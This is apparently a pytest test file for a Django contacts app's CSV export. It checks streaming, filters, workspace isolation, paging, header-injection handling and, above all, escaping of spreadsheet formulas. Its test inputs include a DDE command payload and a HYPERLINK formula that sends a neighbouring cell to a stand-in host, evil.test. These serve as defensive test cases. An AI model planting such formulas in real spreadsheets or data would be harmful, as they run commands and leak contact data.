"""CSV export: it streams, it follows the filter, and it defuses formulas.

The formula-injection tests are the point of this file. A spreadsheet is an
execution context, contact names arrive from strangers (SECURITY-BASELINE §2),
and ``=HYPERLINK("https://…"&B2)`` in a first-name column exfiltrates the email
beside it the moment anyone opens the file.
"""

import csv
import io
import json

import pytest

from apps.contacts import services
from apps.contacts.export import escape_cell
from apps.contacts.models import CustomFieldType


def url(tenancy, suffix: str) -> str:
    return f"/w/{tenancy.workspace.id}/{suffix}"


def rows(response) -> list[list[str]]:
    body = b"".join(response.streaming_content).decode()
    return list(csv.reader(io.StringIO(body)))


@pytest.mark.django_db
class TestExport:
    def test_it_streams_rather_than_buffering(self, tenancy, client_for):
        """A fifty-thousand-contact workspace must cost bounded memory in the web
        process, and the browser should start receiving before the query ends."""
        services.create_contact(tenancy.workspace, first_name="Ada")

        response = client_for(tenancy.owner).get(url(tenancy, "contacts/export/"))

        assert response.streaming is True
        assert response["Content-Type"].startswith("text/csv")
        assert response["Cache-Control"] == "no-store"

    def test_the_filename_is_built_only_from_values_we_chose(self, tenancy, client_for):
        """The workspace *name* is operator-supplied text heading for a
        Content-Disposition header, where a newline is header injection."""
        tenancy.workspace.name = 'Evil"\nX-Injected: yes'
        tenancy.workspace.save(update_fields=["name"])

        response = client_for(tenancy.owner).get(url(tenancy, "contacts/export/"))

        assert str(tenancy.workspace.pk) in response["Content-Disposition"]
        assert "Injected" not in response["Content-Disposition"]

    def test_it_carries_system_fields_tags_and_every_custom_field(self, tenancy, client_for):
        field = services.create_custom_field(tenancy.workspace, name="Plan", field_type=CustomFieldType.TEXT)
        tag, _ = services.get_or_create_tag(tenancy.workspace, "VIP")
        contact = services.create_contact(tenancy.workspace, first_name="Ada", email="ada@example.test")
        services.add_tag(contact, tag)
        services.set_field_value(contact, field, "Pro")

        header, row = rows(client_for(tenancy.owner).get(url(tenancy, "contacts/export/")))

        assert header[:4] == ["id", "first_name", "last_name", "email"]
        assert "Plan" in header
        assert row[header.index("tags")] == "VIP"
        assert row[header.index("Plan")] == "Pro"

    def test_it_exports_exactly_what_the_filter_shows(self, tenancy, client_for):
        tag, _ = services.get_or_create_tag(tenancy.workspace, "VIP")
        inside = services.create_contact(tenancy.workspace, first_name="Insider")
        services.create_contact(tenancy.workspace, first_name="Outsider")
        services.add_tag(inside, tag)
        document = json.dumps({"match": "all", "rules": [{"source": "tag", "key": str(tag.pk), "op": "has"}]})

        exported = rows(client_for(tenancy.owner).get(url(tenancy, "contacts/export/"), {"filter": document}))

        names = [row[1] for row in exported[1:]]
        assert names == ["Insider"]

    def test_a_search_term_narrows_the_export_too(self, tenancy, client_for):
        services.create_contact(tenancy.workspace, first_name="Grace")
        services.create_contact(tenancy.workspace, first_name="Alan")

        exported = rows(client_for(tenancy.owner).get(url(tenancy, "contacts/export/"), {"q": "grace"}))

        assert [row[1] for row in exported[1:]] == ["Grace"]

    def test_a_filter_that_will_not_compile_is_a_404_rather_than_the_whole_workspace(self, tenancy, client_for):
        """Fail closed: an export is the one place where "we were not sure, so
        here is everyone" is worst."""
        services.create_contact(tenancy.workspace, first_name="Everyone")

        response = client_for(tenancy.owner).get(url(tenancy, "contacts/export/?filter=not-json"))

        assert response.status_code == 404

    def test_it_never_leaves_this_workspace(self, tenancy, other_tenancy, client_for):
        services.create_contact(tenancy.workspace, first_name="Mine")
        services.create_contact(other_tenancy.workspace, first_name="Theirs")

        exported = rows(client_for(tenancy.owner).get(url(tenancy, "contacts/export/")))

        names = [row[1] for row in exported[1:]]
        assert names == ["Mine"]

    def test_soft_deleted_contacts_are_not_exported(self, tenancy, client_for):
        gone = services.create_contact(tenancy.workspace, first_name="Tombstone")
        services.delete_contact(gone)

        exported = rows(client_for(tenancy.owner).get(url(tenancy, "contacts/export/")))

        assert len(exported) == 1  # header only

    def test_a_page_boundary_neither_repeats_nor_skips_a_row(self, tenancy, client_for, monkeypatch):
        """Every entry in filters.SORTS ends with the primary key, so the chunked
        slice has a total order to page through."""
        from apps.contacts import export as export_module

        monkeypatch.setattr(export_module, "CHUNK_SIZE", 2)
        for index in range(7):
            services.create_contact(tenancy.workspace, first_name=f"C{index:02d}")

        exported = rows(client_for(tenancy.owner).get(url(tenancy, "contacts/export/")))

        names = [row[1] for row in exported[1:]]
        assert sorted(names) == [f"C{index:02d}" for index in range(7)]
        assert len(names) == len(set(names))


class TestFormulaInjection:
    """No database needed: this is a pure function and the reason it exists."""

    @pytest.mark.parametrize("payload", ["=cmd|' /C calc'!A0", "+1+1", "-2+3", "@SUM(A1)", "\tx", "\rx"])
    def test_every_formula_prefix_is_neutralised(self, payload):
        assert escape_cell(payload).startswith("'")

    def test_the_value_is_preserved_rather_than_stripped(self, payload="+445550101"):
        """A phone number really does start with +. Prefixing is the spreadsheet
        convention for "this is text"; stripping would lose data to defend
        against a payload."""
        assert escape_cell(payload) == "'+445550101"

    def test_an_ordinary_value_is_untouched(self):
        assert escape_cell("Ada Lovelace") == "Ada Lovelace"

    def test_none_is_an_empty_cell_not_the_string_none(self):
        """A re-import of this file has to read "no value"."""
        assert escape_cell(None) == ""

    def test_booleans_render_as_the_words_a_re_import_expects(self):
        assert escape_cell(True) == "true"
        assert escape_cell(False) == "false"


@pytest.mark.django_db
class TestFormulaInjectionEndToEnd:
    def test_a_hostile_contact_name_reaches_the_file_defused(self, tenancy, client_for):
        services.create_contact(
            tenancy.workspace, first_name='=HYPERLINK("https://evil.test?"&A1)', email="ada@example.test"
        )

        body = b"".join(client_for(tenancy.owner).get(url(tenancy, "contacts/export/")).streaming_content).decode()

        assert "'=HYPERLINK" in body
        assert ",=HYPERLINK" not in body


@pytest.mark.django_db
class TestSnapshotConsistency:
    def test_a_contact_whose_sort_key_moves_mid_export_is_written_once(self, tenancy, client_for, monkeypatch):
        """LIMIT/OFFSET paging read each chunk in its own snapshot, so a contact
        who messaged in mid-export moved to the front of `-last_interaction_at`
        and was emitted twice — while the row they displaced was never emitted at
        all. A server-side cursor reads one snapshot."""
        from datetime import timedelta

        from django.utils import timezone

        from apps.contacts import export as export_module
        from apps.contacts.models import Contact

        now = timezone.now()
        for index in range(9):
            services.create_contact(
                tenancy.workspace, first_name=f"C{index:02d}", last_interaction_at=now - timedelta(days=index)
            )
        monkeypatch.setattr(export_module, "CHUNK_SIZE", 3)

        original = export_module._chunks
        state = {"seen": 0}

        def touching_chunks(rows):
            """Shove the oldest contact to the front between chunks."""
            for page in original(rows):
                state["seen"] += 1
                if state["seen"] == 1:
                    Contact.objects.for_workspace(tenancy.workspace).filter(first_name="C08").update(
                        last_interaction_at=timezone.now() + timedelta(days=1)
                    )
                yield page

        monkeypatch.setattr(export_module, "_chunks", touching_chunks)

        exported = rows(client_for(tenancy.owner).get(url(tenancy, "contacts/export/")))

        names = [row[1] for row in exported[1:]]
        assert sorted(names) == [f"C{index:02d}" for index in range(9)]
        assert len(names) == len(set(names))
